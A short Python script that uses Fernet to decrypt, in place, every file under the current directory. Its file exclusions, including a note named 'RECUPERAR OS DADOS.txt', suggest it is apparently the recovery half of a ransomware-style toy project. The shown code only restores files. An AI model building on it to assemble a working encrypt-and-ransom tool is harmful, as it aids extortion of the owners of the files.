import os
from cryptography.fernet import Fernet

def carregar_chave():
    return open("chave.key", "rb").read()

def descriptografar_arquivo(arquivo, chave):
    chave = Fernet(chave)
    with open(arquivo, "rb") as arq:
        dados_criptografados = arq.read()
        dados_descriptografados = chave.decrypt(dados_criptografados)
    with open(arquivo, "wb") as arq:
        arq.write(dados_descriptografados)

def encontrar_arquivos(diretorio):
    lista_arquivos = []
    for root, dirs, files in os.walk(diretorio):
        for nome in files:
            path = os.path.join(root, nome)
            if nome != "main.py" and nome != "RECUPERAR OS DADOS.txt" and nome != "descriptografar.py" and not nome.endswith(".key"):
                lista_arquivos.append(path)
    return lista_arquivos

def main():
    chave = carregar_chave()
    arquivos = encontrar_arquivos(os.getcwd())
    for arquivo in arquivos:
        descriptografar_arquivo(arquivo, chave)

if __name__ == "__main__":
    main()